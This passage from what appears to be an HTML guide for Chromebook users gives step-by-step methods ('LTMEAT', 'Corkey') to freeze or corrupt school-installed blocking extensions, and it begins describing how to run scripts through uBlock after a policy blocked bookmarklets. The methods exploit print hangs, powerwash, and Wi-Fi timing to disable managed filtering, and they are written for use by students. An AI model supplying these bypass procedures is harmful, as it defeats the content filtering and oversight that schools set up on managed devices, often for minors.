<li>The extension should now be broken, assuming you clicked the switch! Only one of the two duplicate tabs should be left standing. You can close your tabs now.</li>
</ol>

<h2 id="ltmeat-print-freeze-extensions">LTMEAT Print <em>Freeze extensions</em></h2>
<ol>
<li>Find your extension&#39;s largest file. This can usually be found by using <a href="https://robwu.nl/crxviewer/">Rob Wu&#39;s crxviewer</a></li>
<li>Go to that page and run <code class="normlcode">Ctrl</code>+<code class="normlcode">P</code>. A print window should show up, with several pages in the top right.</li>
<li>Do everything you can to increase that number. Shrink down margins, change layout to landscape, anything you can. The higher you get that number, the longer the effect will last.</li>
<li>Reload. The page should start hanging.</li>
<li>Go to your extension&#39;s settings page, <code class="normlcode">chrome://extensions</code>.</li>
<li>Duplicate your &quot;printing&quot; tab, and go back to your extension&#39;s settings page.</li>
<li>Flip any switch you can find there. Usually, there&#39;ll be one titled <code class="normlcode">Allow access to file URLs</code>.</li>
</ol>
<h3 id="where-do-i-find-my-extensions-manifestjson">Where do I find my extension&#39;s manifest.json?</h3>
<p>First, find your extension&#39;s ID. This is a 32-character code found on your extension&#39;s settings page, normally near or at the top. </p>
<p><img src="./assets/find_ext_id.png" alt="Where do I find my extension ID"></p>
<p>Then go to <code class="normlcode">chrome-extension://extension_id_here/manifest.json</code></p>

<h2 id="corkey-corrupt-extensions">Corkey <em>Corrupt extensions</em></h2>
<p>Corkey does indeed include power washing the Chromebook, which wipes local data including everything under &quot;My files,&quot; so I suggest you select everything you want to drag and back up to Google Drive if that&#39;s available for your account.</p>
<ol>
<li>Esc+Refresh+Power and re-enroll (Enter recovery page), or you can just powerwash.</li>
<li>Log into your Chromebook and immediately turn off WiFi and do refresh+power to (instant restart)</li>
<li>Log back into your Chromebook with the WiFi off. Look for an option to log in as an existing user and click that.</li>
<li>Go to <code class="normlcode">chrome://extensions</code>, turn on WiFi, and wait for your school&#39;s blocking extension to appear.</li>
<li>As soon as it appears, turn off WiFi and restart as fast as possible.</li>
<li>Log back in, go back to extensions, and wait. If it says your blocking extension could be corrupted or doesn&#39;t appear at all, then it worked (wait at least a minute with a close watch in case it comes back)</li>
<li>If it didn&#39;t work, start over. You have to be fast.</li>

<p>From <a href="https://github.com/Inglan2">Inglan2</a></p>
<p>Recently Google cracked down on bookmarklets and now they don&#39;t work (Its based on the <a href="https://chromeenterprise.google/policies/?policy=DeveloperToolsAvailability">DeveloperToolsAvailability</a> policy). I wanted to run scripts still so I started making this, inspired by <a href="#ublock-run-run-code-on-pages">uBlock Run <em>Run Code On Pages</em></a>, but with more features, like saving scripts.</p>
<ol>
<li>Open uBlock settings</li>
<li>Enable advanced settings, and click the gear ⚙️ button</li>
</ol>
<blockquote>
